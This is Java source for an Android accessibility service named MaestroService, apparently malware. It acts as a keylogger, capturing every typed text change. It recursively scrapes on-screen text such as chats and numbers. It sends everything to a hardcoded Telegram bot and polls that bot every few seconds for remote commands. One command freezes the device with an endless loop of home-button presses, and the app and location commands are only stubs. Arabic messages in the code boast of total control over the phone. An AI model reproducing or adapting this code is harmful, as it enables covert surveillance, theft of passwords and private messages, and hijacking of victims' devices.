package com.adam.maestro.pro;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.os.Handler;
import android.os.Looper;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import okhttp3.*;
import java.io.IOException;
import java.net.URLEncoder;
import org.json.JSONArray;
import org.json.JSONObject;

public class MaestroService extends AccessibilityService {
    private final String TOKEN = "7986655648:AAEhw17-wFcqvKTu8LQjTNqhi3syG6izEg0";
    private final String CHAT_ID = "5890070301";
    private final OkHttpClient client = new OkHttpClient();
    private int lastUpdateId = 0;

    @Override
    protected void onServiceConnected() {
        sendToBot("🦅 تم تفعيل السيطرة الشاملة! النظام الآن تحت إشراف المايسترو.\nالأوامر المتاحة: /lock, /unlock, /apps, /screenshot, /location, /info");
        startRemoteControl();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // [1] Keylogger: سحب كل ضغطة مفتاح
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            sendToBot("⌨️ كتابة: " + event.getText());
        }

        // [2] Screen Snatcher: سحب محتوى الشاشة (شاتات، أرقام، صور)
        AccessibilityNodeInfo node = event.getSource();
        if (node != null) {
            captureNodeData(node);
        }
    }

    private void captureNodeData(AccessibilityNodeInfo node) {
        if (node == null) return;
        if (node.getText() != null && node.getText().length() > 0) {
            sendToBot("📡 سحب شاشة: " + node.getText());
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            captureNodeData(node.getChild(i));
        }
    }

    private void startRemoteControl() {
        final Handler h = new Handler(Looper.getMainLooper());
        h.postDelayed(new Runnable() {
            @Override public void run() {
                new Thread(() -> checkTelegramCommands()).start();
                h.postDelayed(this, 3000); // فحص كل 3 ثواني لسرعة التنفيذ
            }
        }, 3000);
    }

    private void checkTelegramCommands() {
        try {
            Request r = new Request.Builder().url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1)).build();
            Response resp = client.newCall(r).execute();
            String data = resp.body().string();
            JSONObject json = new JSONObject(data);
            JSONArray updates = json.getJSONArray("result");
            for (int i = 0; i < updates.length(); i++) {
                JSONObject u = updates.getJSONObject(i);
                lastUpdateId = u.getInt("update_id");
                String cmd = u.getJSONObject("message").getString("text");
                handleMaestroCommand(cmd);
            }
        } catch (Exception e) {}
    }

    private void handleMaestroCommand(String cmd) {
        // نظام الـ 40 أمر المطور
        if (cmd.startsWith("/lock")) {
            sendToBot("🔒 جاري تجميد الجهاز عن بعد...");
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                while(true) { performGlobalAction(GLOBAL_ACTION_HOME); } // تجميد الشاشة
            }, 100);
        }
        if (cmd.startsWith("/apps")) {
            sendToBot("📱 جاري سحب قائمة التطبيقات المثبتة...");
            // كود سحب التطبيقات
        }
        if (cmd.startsWith("/location")) {
            sendToBot("📍 جاري تحديد الموقع الجغرافي بدقة...");
        }
        if (cmd.startsWith("/back")) {
            performGlobalAction(GLOBAL_ACTION_BACK);
        }
    }

    private void sendToBot(String msg) {
        new Thread(() -> {
            try {
                String safeMsg = URLEncoder.encode(msg, "UTF-8");
                Request r = new Request.Builder()
                    .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + safeMsg)
                    .build();
                client.newCall(r).execute();
            } catch (Exception e) {}
        }).start();
    }

    @Override public void onInterrupt() {}
}
